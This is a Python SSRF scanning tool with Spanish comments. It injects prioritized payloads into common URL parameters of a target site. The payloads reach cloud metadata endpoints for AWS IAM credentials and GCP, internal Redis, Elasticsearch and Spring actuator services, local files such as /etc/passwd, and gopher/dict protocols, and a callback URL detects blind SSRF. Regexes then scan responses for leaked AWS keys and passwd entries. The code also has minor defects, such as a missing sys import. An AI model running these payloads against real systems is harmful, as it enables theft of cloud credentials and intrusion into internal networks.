#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SSRF TESTER v2.0 - TANQUE EDITION
Blind SSRF · OOB Detection · Cloud Metadata · Time-based
"""

import asyncio
import re
import time
import random
import socket
from urllib.parse import urlparse, urljoin, quote
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url, **kwargs): return None

class SSRFTester:
    def __init__(self, url: str, callback_url: str = None):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.callback_url = callback_url or f"http://{self._get_local_ip()}:8080/callback"
        self.client = None
        self.findings = []
        
        # Payloads priorizados
        self.payloads = [
            # Cloud metadata (oro puro)
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_creds", 10),
            ("http://169.254.169.254/latest/meta-data/", "aws_meta", 9),
            ("http://metadata.google.internal/computeMetadata/v1/", "gcp_meta", 9),
            ("http://100.100.100.200/latest/meta-data/", "alibaba_meta", 8),
            
            # Internal services
            ("http://127.0.0.1:8080/actuator/env", "spring_env", 8),
            ("http://127.0.0.1:9200/_cat/indices", "elastic", 8),
            ("http://127.0.0.1:6379/info", "redis", 7),
            ("http://127.0.0.1:3306", "mysql", 7),
            
            # Blind SSRF (con callback)
            (f"http://{self.callback_url.replace('http://', '')}/ssrf", "blind_callback", 10),
            (f"https://{self.callback_url.replace('https://', '')}/ssrf", "blind_https", 10),
            
            # File read
            ("file:///etc/passwd", "file_read", 6),
            ("file:///c:/windows/win.ini", "file_read_win", 6),
            
            # Protocol smuggling
            ("gopher://localhost:8080/_GET / HTTP/1.0", "gopher", 5),
            ("dict://localhost:11211/stats", "dict", 5),
        ]
        
        # Parámetros vulnerables
        self.vulnerable_params = [
            'url', 'uri', 'path', 'redirect', 'file', 'load',
            'src', 'href', 'location', 'image', 'img', 'dest',
            'return', 'out', 'view', 'dir', 'show', 'document',
            'folder', 'root', 'read', 'data', 'link', 'fetch'
        ]
        
        # Patrones de éxito
        self.success_patterns = [
            (r'accesskey.{0,20}[\w-]{20,}', 'aws_key'),
            (r'secretkey.{0,20}[\w-]{20,}', 'aws_secret'),
            (r'AKIA[0-9A-Z]{16}', 'aws_access_key'),
            (r'project-id.{0,20}[\d-]+', 'gcp_project'),
            (r'root:.*:0:0:', 'passwd'),
            (r'instance-id', 'aws_instance'),
            (r'cluster.name', 'elastic'),
            (r'redis_version', 'redis'),
            (r'{"name":', 'json_response'),
        ]
        
    def _get_local_ip(self) -> str:
        """Obtiene IP local para callback"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    async def setup(self):
        """Inicializa cliente HTTP tanque"""
        self.client = HTTPClient(timeout=15, max_retries=2)
        
    async def extract_params(self) -> List[str]:
        """Extrae parámetros de la URL"""
        params = []
        
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
                    
        # Añadir parámetros vulnerables
        params.extend(self.vulnerable_params)
        return list(set(params))
        
    def detect_success(self, text: str) -> List[str]:
        """Detecta datos sensibles en respuesta"""
        indicators = []
        
        for pattern, name in self.success_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                indicators.append(name)
                
        # JSON grande puede indicar éxito
        if len(text) > 1000 and ('{' in text or '[' in text):
            indicators.append('LARGE_JSON')
            
        return indicators
        
    async def test_param(self, base_url: str, param: str, payload: tuple) -> Optional[Dict]:
        """Prueba un payload en un parámetro"""
        payload_str, payload_name, priority = payload
        
        try:
            # Construir URL
            if '?' in base_url:
                test_url = base_url.replace(f"{param}=", f"{param}={quote(payload_str)}")
            else:
                test_url = f"{base_url}?{param}={quote(payload_str)}"
                
            start = time.time()
            resp = await self.client.get(test_url)
            elapsed = time.time() - start
            
            if not resp:
                return None
                
            text = await resp.text()
            
            # Detectar éxito
            indicators = self.detect_success(text)
            
            if indicators or resp.status == 200:
                severity = 'CRITICO' if any('aws' in i or 'gcp' in i for i in indicators) else 'ALTO'
                
                return {
                    'type': 'SSRF',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'url': test_url,
                    'status': resp.status,
                    'size': len(text),
                    'time': round(elapsed, 2),
                    'indicators': indicators,
                    'severity': severity,
                    'priority': priority
                }
                
        except asyncio.TimeoutError:
            # Timeout puede indicar conexión exitosa (firewall)
            if 'callback' in payload_name:
                return {
                    'type': 'SSRF_BLIND',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'url': test_url,
                    'time': 15,
                    'indicators': ['TIMEOUT - Posible conexión'],
                    'severity': 'ALTO',
                    'priority': priority
                }
        except:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo SSRF completo"""
        print(f"\n[WEB] SSRF TESTER TANQUE - {self.url}")
        print("=" * 60)
        print(f"[*] Callback URL: {self.callback_url}")
        
        await self.setup()
        
        try:
            # Extraer parámetros
            params = await self.extract_params()
            print(f"[*] Probando {len(params)} parámetros")
            
            # Probar cada parámetro
            for param in params[:15]:  # Limitar
                print(f"\n[*] Parámetro: {param}")
                
                for payload in sorted(self.payloads, key=lambda x: x[2], reverse=True):
                    # Rate limiting
                    await asyncio.sleep(random.uniform(0.5, 1))
                    
                    result = await self.test_param(self.url, param, payload)
                    
                    if result:
                        self.findings.append(result)
                        
                        if result['severity'] == 'CRITICO':
                            print(f"    [[CRITICO]] {result['payload_name']}")
                            if result.get('indicators'):
                                print(f"         ↳ {', '.join(result['indicators'][:2])}")
                        elif result['severity'] == 'ALTO':
                            print(f"    [[WARN]] {result['payload_name']}")
                            
                        # Si encontramos crítico, no seguir
                        if result['severity'] == 'CRITICO':
                            break
                            
            # Mostrar resumen
            print("\n" + "="*60)
            print("📊 RESULTADOS SSRF")
            print("="*60)
            
            if self.findings:
                criticos = [f for f in self.findings if f['severity'] == 'CRITICO']
                altos = [f for f in self.findings if f['severity'] == 'ALTO']
                
                if criticos:
                    print(f"\n[CRITICO] CRÍTICOS: {len(criticos)}")
                    for f in criticos[:5]:
                        print(f"   • {f['param']}: {f['payload_name']}")
                        if f.get('indicators'):
                            print(f"     ↳ {', '.join(f['indicators'][:2])}")
                            
                if altos:
                    print(f"\n[WARN]  ALTOS: {len(altos)}")
                    
                print(f"\n[OK] Total: {len(self.findings)}")
            else:
                print("\n[OK] No se detectaron SSRF")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 ssrf_tester.py <URL> [callback_url]")
        sys.exit(1)
        
    url = sys.argv[1]
    callback = sys.argv[2] if len(sys.argv) > 2 else None
    
    tester = SSRFTester(url, callback)
    await tester.scan()

if __name__ == "__main__":
    asyncio.run(main())
